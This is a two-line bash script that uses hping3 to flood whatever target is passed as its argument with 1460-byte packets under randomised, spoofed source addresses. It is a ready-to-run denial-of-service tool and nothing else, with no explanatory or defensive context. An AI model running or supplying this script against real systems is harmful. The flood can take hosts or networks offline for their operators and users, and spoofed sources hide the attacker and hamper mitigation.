#!/bin/bash
sudo hping3 --flood --rand-source -d 1460 "$1"
